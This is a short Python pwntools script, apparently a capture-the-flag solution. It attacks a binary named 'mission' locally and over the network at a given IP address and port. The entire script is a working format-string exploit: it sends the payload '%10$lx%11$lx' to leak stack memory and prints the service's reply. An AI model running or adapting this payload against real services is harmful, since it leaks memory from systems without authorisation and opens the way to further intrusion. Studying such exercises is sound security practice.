from pwn import *
#nc 43.205.113.100 8649
payload = b"%10$lx" + b"%11$lx"


def local_pwn():
    p = process("./mission")
    p.recvuntil("(Y/n)")
    p.sendline(b"y")
    print(p.recvuntil("name again?"))
    p.sendline(payload)
    print(p.recvline_contains("with you"))

def remote_pwn():
    p = remote("43.205.113.100", 8649)
    p.recvuntil("(Y/n)")
    p.sendline(b"y")
    print(p.recvuntil("name again?"))
    p.sendline(payload)
    print(p.recvline_contains("with you"))

remote_pwn()